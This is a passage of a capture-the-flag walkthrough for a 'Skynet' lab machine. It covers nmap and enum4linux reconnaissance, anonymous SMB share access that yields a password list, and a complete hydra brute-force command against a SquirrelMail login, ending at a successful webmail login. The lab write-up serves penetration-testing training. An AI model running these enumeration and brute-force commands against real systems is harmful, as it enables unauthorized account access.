# Skynet

The first thing that we should do is network scanning through nmap:

```bash
nmap -sV 10.10.99.10
```

![Alt text](../Screenshots/Skynet/nmap.png)

Now we can see that there are samba shares. Then I ran enumeration tool for linux target machine:

```bash
enum4linux -a <target_ip>
```

Moreover there is a listed user shown in the following image named `milesdyson`:
![Alt text](../Screenshots/Skynet/users.png)

It gave me following share
![Alt text](../Screenshots/Skynet/shares.png)

Simaltaneously, I started directory enumeration and found the following results:
![Alt text](../Screenshots/Skynet/dir_enum.png)

And there is an interesting directory seems `squirrelmail`. I visited it and found:

![Alt text](../Screenshots/Skynet/squirrelmail_login.png)

We can get some useful information through shares so I tried to get into them using the command:

```bash
smbclient //<target_ip>/anonymous -N
```

Now go into logs directory where you will find 3 log files:
![Alt text](../Screenshots/Skynet/logs.png)
```bash
get log1.txt
```
Using above command you can transfer there log files into your attacking machine on the path from where you ran the above smbClient command. Inside `log1.txt` there are many passwords. Useranme we already know, now we should try to crack the password:
```bash
hydra -l milesdyson -P log1.txt <target_ip> http-post-form \
"/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password" \
-V -t 16
```
We found the password:
![Alt text](../Screenshots/Skynet/password_found_hydra.png)

Now we have username and password, so let's try it on `squirrelmail` directory. Yes!! we logged in successfully as you can see:

![Alt text](../Screenshots/Skynet/squirrelmail_login_home.png)

